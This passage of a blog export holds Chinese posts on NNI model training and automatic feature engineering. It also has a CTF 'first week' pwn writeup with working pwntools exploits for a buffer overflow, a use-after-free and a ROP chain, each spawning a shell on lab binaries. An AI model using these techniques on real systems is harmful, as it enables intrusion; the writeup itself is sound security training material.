<h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><p>经10个epoch的训练，最终输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\12058\anaconda3\python.exe C:&#x2F;Users&#x2F;12058&#x2F;Documents&#x2F;GitHub&#x2F;nni-learning&#x2F;task2&#x2F;2.1&#x2F;main.py</span><br><span class="line">[    1,  2000] loss &#x3D; 2.16590</span><br><span class="line">[    1,  4000] loss &#x3D; 1.82480</span><br><span class="line">[    1,  6000] loss &#x3D; 1.64638</span><br><span class="line">[    1,  8000] loss &#x3D; 1.56156</span><br><span class="line">[    1, 10000] loss &#x3D; 1.49378</span><br><span class="line">[    1, 12000] loss &#x3D; 1.46539</span><br><span class="line">[    2,  2000] loss &#x3D; 1.39108</span><br><span class="line">[    2,  4000] loss &#x3D; 1.38308</span><br><span class="line">[    2,  6000] loss &#x3D; 1.36254</span><br><span class="line">[    2,  8000] loss &#x3D; 1.30314</span><br><span class="line">[    2, 10000] loss &#x3D; 1.30563</span><br><span class="line">[    2, 12000] loss &#x3D; 1.26935</span><br><span class="line">[    3,  2000] loss &#x3D; 1.21411</span><br><span class="line">[    3,  4000] loss &#x3D; 1.21809</span><br><span class="line">[    3,  6000] loss &#x3D; 1.17786</span><br><span class="line">[    3,  8000] loss &#x3D; 1.18651</span><br><span class="line">[    3, 10000] loss &#x3D; 1.16956</span><br><span class="line">[    3, 12000] loss &#x3D; 1.16728</span><br><span class="line">[    4,  2000] loss &#x3D; 1.10504</span><br><span class="line">[    4,  4000] loss &#x3D; 1.11141</span><br><span class="line">[    4,  6000] loss &#x3D; 1.07836</span><br><span class="line">[    4,  8000] loss &#x3D; 1.10194</span><br><span class="line">[    4, 10000] loss &#x3D; 1.07333</span><br><span class="line">[    4, 12000] loss &#x3D; 1.06928</span><br><span class="line">[    5,  2000] loss &#x3D; 0.98897</span><br><span class="line">[    5,  4000] loss &#x3D; 1.01186</span><br><span class="line">[    5,  6000] loss &#x3D; 1.01296</span><br><span class="line">[    5,  8000] loss &#x3D; 1.01628</span><br><span class="line">[    5, 10000] loss &#x3D; 1.02610</span><br><span class="line">[    5, 12000] loss &#x3D; 1.03693</span><br><span class="line">[    6,  2000] loss &#x3D; 0.94843</span><br><span class="line">[    6,  4000] loss &#x3D; 0.94470</span><br><span class="line">[    6,  6000] loss &#x3D; 0.96298</span><br><span class="line">[    6,  8000] loss &#x3D; 0.96035</span><br><span class="line">[    6, 10000] loss &#x3D; 0.98843</span><br><span class="line">[    6, 12000] loss &#x3D; 0.96657</span><br><span class="line">[    7,  2000] loss &#x3D; 0.87795</span><br><span class="line">[    7,  4000] loss &#x3D; 0.90013</span><br><span class="line">[    7,  6000] loss &#x3D; 0.91402</span><br><span class="line">[    7,  8000] loss &#x3D; 0.94256</span><br><span class="line">[    7, 10000] loss &#x3D; 0.93912</span><br><span class="line">[    7, 12000] loss &#x3D; 0.91624</span><br><span class="line">[    8,  2000] loss &#x3D; 0.84444</span><br><span class="line">[    8,  4000] loss &#x3D; 0.85796</span><br><span class="line">[    8,  6000] loss &#x3D; 0.90461</span><br><span class="line">[    8,  8000] loss &#x3D; 0.89855</span><br><span class="line">[    8, 10000] loss &#x3D; 0.89341</span><br><span class="line">[    8, 12000] loss &#x3D; 0.89116</span><br><span class="line">[    9,  2000] loss &#x3D; 0.79060</span><br><span class="line">[    9,  4000] loss &#x3D; 0.83296</span><br><span class="line">[    9,  6000] loss &#x3D; 0.84468</span><br><span class="line">[    9,  8000] loss &#x3D; 0.85216</span><br><span class="line">[    9, 10000] loss &#x3D; 0.86738</span><br><span class="line">[    9, 12000] loss &#x3D; 0.87915</span><br><span class="line">[   10,  2000] loss &#x3D; 0.76653</span><br><span class="line">[   10,  4000] loss &#x3D; 0.80672</span><br><span class="line">[   10,  6000] loss &#x3D; 0.82791</span><br><span class="line">[   10,  8000] loss &#x3D; 0.80691</span><br><span class="line">[   10, 10000] loss &#x3D; 0.83649</span><br><span class="line">[   10, 12000] loss &#x3D; 0.84138</span><br><span class="line">Training Finished</span><br><span class="line">Accuracy of plane: 81.14%</span><br><span class="line">Accuracy of car: 92.10%</span><br><span class="line">Accuracy of bird: 74.58%</span><br><span class="line">Accuracy of cat: 47.94%</span><br><span class="line">Accuracy of deer: 65.08%</span><br><span class="line">Accuracy of dog: 61.28%</span><br><span class="line">Accuracy of frog: 71.88%</span><br><span class="line">Accuracy of horse: 73.24%</span><br><span class="line">Accuracy of ship: 86.18%</span><br><span class="line">Accuracy of truck: 66.52%</span><br><span class="line">Testing Finished</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看出，损失值总体稳定下降，对车、飞机、船等图像分类准确率较高，而对猫、狗、卡车等图像的准确率较不理想。</p>
<p>如何提高部分不理想的分类准确率？请看Task 2.2……</p>
<h2 id="Task-2-2"><a href="#Task-2-2" class="headerlink" title="Task 2.2"></a>Task 2.2</h2><p>to be continued…</p>
]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>Writeup for First Week</title>
    <url>/2021/01/14/Writeup-for-First-Week/</url>
    <content><![CDATA[<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。</p>
<p>system函数已经在Print函数中给出来了。只要有一个<code>/bin/sh</code>就够了。</p>
<p>但是这样也不准确，只需要<code>sh</code>就可以了。</p>
<p>以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string &#39;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x080482ea : sh</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27077</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x48</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(system_plt) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x080482ea</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input admin password:&#x27;</span>, <span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input new log info:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;0.Exit\n:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="HITCON-training-hacknote"><a href="#HITCON-training-hacknote" class="headerlink" title="HITCON-training hacknote"></a>HITCON-training hacknote</h2><p>UAF第一道题。</p>
<p>UAF即free掉之后却没有置0，这个残留指针可以再被利用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_addr = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p>这道题挺好玩的，要好好记录一下。</p>
<p>IDA翻译成C出来根本没法读，只能看汇编（汇编更容易看</p>
<p>主程序在<code>vuln</code>函数里，先从<code>%rsp - 0x10</code>的地址开始读入至多0x400个字符，然后输出0x30个字符，显然栈溢出。</p>
<p>然后还有个<code>gadget</code>函数，很清楚地能看出<code>mov $0xf, %rax</code>和<code>mov $0x3b, %rax</code>这两个gadget，第一个是sigreturn的调用号，第二个就是execve的调用号。</p>
<p>然后针对这两个gadgets，分别有SROP和利用通用gadget做ROP这两种方法。</p>
<p>SROP在网上看到的似乎打不通，就只用普通ROP的做法。</p>
<p>由于需要控制rdx，需要辛苦点用上通用gadget。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;28690&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">csu_end = <span class="number">0x40059a</span></span><br><span class="line">csu_front = <span class="number">0x400580</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">mov_rax_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">buf = p.recv()[:<span class="number">8</span>]</span><br><span class="line">leak_addr = u64(buf)</span><br><span class="line">binsh_addr = leak_addr - <span class="number">0x138</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(mov_rax_ret)</span><br><span class="line">payload += p64(csu_end) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_front) + p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program 2020 Task3</title>
    <url>/2021/01/29/NNI-Student-Program-2020-Task3/</url>
    <content><![CDATA[<h1 id="Task-3-进阶任务"><a href="#Task-3-进阶任务" class="headerlink" title="Task 3 进阶任务"></a>Task 3 进阶任务</h1><h2 id="特征工程简介"><a href="#特征工程简介" class="headerlink" title="特征工程简介"></a>特征工程简介</h2><p>有这么一句话在业界广泛流传：</p>
<blockquote>
<p>数据和特征决定了机器学习的上限，而模型和算法只是逼近这个上限而已。</p>
</blockquote>
<p>数据是特征的来源，特征是给定算法下模型精确度的最大决定因素，可见提升特征质量意义重大。</p>
<p>特征工程(Feature Engineering)是机器学习的一个重要分支，指的是通过多种数据处理方法，从原始数据提取出若干个能优秀反映问题的特征，以提升最终算法与模型准确率的过程。</p>
<h2 id="自动特征工程"><a href="#自动特征工程" class="headerlink" title="自动特征工程"></a>自动特征工程</h2><p>自动特征工程是一种新技术，是机器学习发展的一大步。自动特征工程能够在降低时间成本的同时，生成更优秀的特征，从而构建出准确率更高的模型。</p>
<p>利用NNI的自动特征工程实现，我们通过简单调用函数便可实现特征工程的自动调优。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li>nni</li>
<li>numpy</li>
<li>lightgbm: 微软开源算法</li>
<li>pandas: 基于python的数据分析强力工具</li>
<li>sklearn: 集成了特征工程相关的常用函数</li>
</ul>
<p>建议在conda环境下部署自动特征工程python环境。</p>
<p>此外，由于pandas版本更新，直接运行自带项目会报错，实际上只需修改<code>fe_util.py</code>中的<code>agg</code>参数类型即可，大致修改如下：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">def aggregate(df, num_col, col, stat_list = AGGREGATE_TYPE):</span><br><span class="line"><span class="deletion">-   agg_dict = &#123;&#125;</span></span><br><span class="line"><span class="addition">+   agg_list = []</span></span><br><span class="line">    for i in stat_list:</span><br><span class="line"><span class="deletion">-       agg_dict[(&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col)] = i</span></span><br><span class="line"><span class="addition">+       agg_list.append((&#x27;AGG_&#123;&#125;_&#123;&#125;_&#123;&#125;&#x27;.format(i, num_col, col), i))</span></span><br><span class="line"><span class="deletion">-   agg_result = df.groupby([col])[num_col].agg(agg_dict)</span></span><br><span class="line"><span class="addition">+   agg.result = df.groupby([col])[num_col].agg(agg_list)</span></span><br><span class="line">    r = left_merge(df, agg_result, on = [col])</span><br><span class="line">    df = concat([df, r])</span><br><span class="line">    return df</span><br></pre></td></tr></table></figure>
<p>该修改已提交pull request至原项目。</p>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="配置搜索空间"><a href="#配置搜索空间" class="headerlink" title="配置搜索空间"></a>配置搜索空间</h3><p>NNI的自动特征工程支持count、crosscount、aggregate等一阶与二阶特征运算，配置搜索空间时只需按json格式填写搜索范围。具体填写方法以项目示例搜索空间为例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;count&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;aggregate&quot;</span>:[</span><br><span class="line">        [<span class="string">&quot;I9&quot;</span>,<span class="string">&quot;I10&quot;</span>,<span class="string">&quot;I11&quot;</span>,<span class="string">&quot;I12&quot;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;crosscount&quot;</span>:[</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;C1&quot;</span>,<span class="string">&quot;C2&quot;</span>,<span class="string">&quot;C3&quot;</span>,<span class="string">&quot;C4&quot;</span>,<span class="string">&quot;C5&quot;</span>,<span class="string">&quot;C6&quot;</span>,<span class="string">&quot;C7&quot;</span>,<span class="string">&quot;C8&quot;</span>,<span class="string">&quot;C9&quot;</span>,<span class="string">&quot;C10&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C11&quot;</span>,<span class="string">&quot;C12&quot;</span>,<span class="string">&quot;C13&quot;</span>,<span class="string">&quot;C14&quot;</span>,<span class="string">&quot;C15&quot;</span>,<span class="string">&quot;C16&quot;</span>,<span class="string">&quot;C17&quot;</span>,<span class="string">&quot;C18&quot;</span>,<span class="string">&quot;C19&quot;</span>,</span><br><span class="line">            <span class="string">&quot;C20&quot;</span>,<span class="string">&quot;C21&quot;</span>,<span class="string">&quot;C22&quot;</span>,<span class="string">&quot;C23&quot;</span>,<span class="string">&quot;C24&quot;</span>,<span class="string">&quot;C25&quot;</span>,<span class="string">&quot;C26&quot;</span></span><br><span class="line">        ]</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导入tuner"><a href="#导入tuner" class="headerlink" title="导入tuner"></a>导入tuner</h3><p>导入自动特征工程的tuner时，需要在<code>config.yml</code>中的<code>tuner</code>项添加相关信息，其他地方正常填写即可。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">tuner:</span></span><br><span class="line">  <span class="attr">codeDir:</span> <span class="string">.</span></span><br><span class="line">  <span class="attr">classFileName:</span> <span class="string">autofe_tuner.py</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">AutoFETuner</span></span><br><span class="line">  <span class="attr">classArgs:</span></span><br><span class="line">    <span class="attr">optimize_mode:</span> <span class="string">maximize</span></span><br></pre></td></tr></table></figure>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Tuner在生成的搜索空间中随机选取一定数量的feature组合，通过<code>nni.get_next_parameter()</code>的接口，以dict的形式返回给单次trial。经一系列处理后运行lightGBM算法，得到最终以AUC形式呈现的结果。</p>
<p>调用代码主体部分如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get parameter from tuner</span></span><br><span class="line">RECEIVED_PARAMS = nni.get_next_parameter()</span><br><span class="line">logger.info(<span class="string">&quot;Received params:\n&quot;</span>, RECEIVED_PARAMS)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get sample column from parameter</span></span><br><span class="line">df = pd.read_csv(file_name)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;sample_feature&#x27;</span> <span class="keyword">in</span> RECEIVED_PARAMS.keys():</span><br><span class="line">    sample_col = RECEIVED_PARAMS[<span class="string">&#x27;sample_feature&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sample_col = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># df: raw feaure + sample_feature</span></span><br><span class="line">df = name2feature(df, sample_col, target_name)</span><br><span class="line">feature_imp, val_score = lgb_model_train(df, _epoch=<span class="number">1000</span>, target_name=target_name,id_index=id_index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># report result to nni</span></span><br><span class="line">nni.report_final_result(&#123;</span><br><span class="line">    <span class="string">&quot;default&quot;</span>:val_score, </span><br><span class="line">    <span class="string">&quot;feature_importance&quot;</span>:feature_imp</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="项目示例运行结果"><a href="#项目示例运行结果" class="headerlink" title="项目示例运行结果"></a>项目示例运行结果</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_1.png">
<h3 id="Top-10-Trials"><a href="#Top-10-Trials" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_2.png">
<h3 id="Default-Metric"><a href="#Default-Metric" class="headerlink" title="Default Metric"></a>Default Metric</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_4.png">
<h3 id="Hyper-parameter"><a href="#Hyper-parameter" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/task3_6.png">
<h3 id="Feature-Importance-of-Top-1-Trial"><a href="#Feature-Importance-of-Top-1-Trial" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         feature_name  split  ...  split_percent  feature_score</span><br><span class="line">5                  I6     39  ...      11.504425       0.145729</span><br><span class="line">4                  I5     20  ...       5.899705       0.067777</span><br><span class="line">85     AGG_max_I9_C17     14  ...       4.129794       0.053053</span><br><span class="line">76      count_C18_C23     11  ...       3.244838       0.031225</span><br><span class="line">43   AGG_mean_I11_C16      9  ...       2.654867       0.029425</span><br><span class="line">..                ...    ...  ...            ...            ...</span><br><span class="line">86    AGG_var_I11_C25      0  ...       0.000000       0.000000</span><br><span class="line">82      count_C12_C20      0  ...       0.000000       0.000000</span><br><span class="line">80       count_C1_C17      0  ...       0.000000       0.000000</span><br><span class="line">77       count_C1_C23      0  ...       0.000000       0.000000</span><br><span class="line">100     count_C15_C21      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[162 rows x 6 columns]</span><br></pre></td></tr></table></figure>
<p>若想要查询某一次trial的feature importance，只需在WebUI中按下Copy as json，再代入原程序运行就可以获得了。</p>
<h2 id="heart数据集运行结果"><a href="#heart数据集运行结果" class="headerlink" title="heart数据集运行结果"></a>heart数据集运行结果</h2><p><a href="http://archive.ics.uci.edu/ml/datasets/Statlog+%28Heart%29">数据集地址</a></p>
<p>heart数据集收集了中老年人是否患心脏病的270条数据，每条数据有13条属性，本质上是一个二分类问题的数据。</p>
<p>我们希望通过特征工程，从数据中挖掘出心脏病患病与其他事件的相关性，从庞杂的数据中得出结论。</p>
<p>初始AUC为0.932367，使用了NNI自动特征工程之后，AUC上升到了0.97343，比原始精确度高出许多。</p>
<h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example1.png">
<h3 id="Top-10-Trials-1"><a href="#Top-10-Trials-1" class="headerlink" title="Top 10 Trials"></a>Top 10 Trials</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example2.png">
<h3 id="Default"><a href="#Default" class="headerlink" title="Default"></a>Default</h3><p>Sorted Default MetricMetric</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example3.png">
<h3 id="Hyper-parameter-1"><a href="#Hyper-parameter-1" class="headerlink" title="Hyper-parameter"></a>Hyper-parameter</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3/example4.png">
<h3 id="Feature-Importance-of-Top-1-Trial-1"><a href="#Feature-Importance-of-Top-1-Trial-1" class="headerlink" title="Feature Importance of Top 1 Trial"></a>Feature Importance of Top 1 Trial</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                     feature_name  split  ...  split_percent  feature_score</span><br><span class="line">113          count_chest-pain_sex      4  ...       9.302326       0.197441</span><br><span class="line">37      AGG_var_chest-pain_hr-max      5  ...      11.627907       0.083669</span><br><span class="line">53         AGG_median_age_vessels      3  ...       6.976744       0.075381</span><br><span class="line">0                             age      3  ...       6.976744       0.058558</span><br><span class="line">12                           thal      2  ...       4.651163       0.056385</span><br><span class="line">..                            ...    ...  ...            ...            ...</span><br><span class="line">54            AGG_max_sex_vessels      0  ...       0.000000       0.000000</span><br><span class="line">52   AGG_median_chest-pain_hr-max      0  ...       0.000000       0.000000</span><br><span class="line">51     AGG_median_bs-fasting_thal      0  ...       0.000000       0.000000</span><br><span class="line">50       AGG_mean_age_cholesterol      0  ...       0.000000       0.000000</span><br><span class="line">138            AGG_var_sex_hr-max      0  ...       0.000000       0.000000</span><br><span class="line"></span><br><span class="line">[139 rows x 6 columns]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>NNI</tag>
      </tags>
  </entry>
  <entry>
    <title>NNI Student Program Task3.2</title>
    <url>/2021/03/01/NNI-Student-Program-Task3-2/</url>
